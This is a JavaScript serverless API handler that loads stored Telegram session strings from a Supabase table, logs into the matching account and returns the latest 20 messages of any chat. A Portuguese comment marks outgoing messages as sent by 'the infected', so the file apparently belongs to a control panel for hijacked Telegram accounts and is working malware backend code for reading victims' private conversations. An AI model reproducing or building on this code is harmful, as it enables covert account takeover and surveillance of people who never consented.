import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
const apiId = parseInt(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const { phone, chatId } = req.body;

  try {
    const { data: sessionData } = await supabase
      .from('telegram_sessions')
      .select('session_string')
      .eq('phone_number', phone)
      .single();

    if (!sessionData) return res.status(404).json({ error: 'Sessão não encontrada' });

    const client = new TelegramClient(new StringSession(sessionData.session_string), apiId, apiHash, {
      connectionRetries: 1,
      useWSS: false, 
    });
    
    await client.connect();

    // Busca as últimas 20 mensagens do chat
    const messages = await client.getMessages(chatId, { limit: 20 });
    
    const history = messages.map(m => ({
        id: m.id,
        text: m.message || '(Mídia/Sticker)',
        date: m.date,
        sender: m.sender?.firstName || 'Desconhecido',
        isMedia: !!m.media, // Marca se tem foto/video
        isOut: m.out // Marca se foi enviada pelo infectado (true) ou recebida (false)
    })).reverse(); // Inverte para mostrar a mais antiga em cima

    await client.disconnect();
    
    res.status(200).json({ history });

  } catch (error) {
    console.error("Erro ao ler chat:", error);
    res.status(500).json({ error: error.message });
  }
}
